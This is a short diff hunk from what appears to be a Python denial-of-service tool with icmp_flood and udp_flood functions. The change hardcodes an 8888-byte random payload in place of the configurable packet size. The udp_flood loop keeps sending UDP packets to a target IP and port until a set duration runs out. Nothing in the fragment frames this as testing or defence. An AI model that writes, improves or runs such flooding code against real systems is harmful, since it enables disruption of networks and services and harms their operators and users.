@@ -21,7 +21,7 @@ def icmp_flood(ip, duration):
 def udp_flood(ip, port, packet_size, duration):
     global packet_counter
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    payload = random._urandom(packet_size)
+    payload = random._urandom(8888)
     end_time = time.time() + duration
     while time.time() < end_time and not stop_event.is_set():
         sock.sendto(payload, (ip, port))
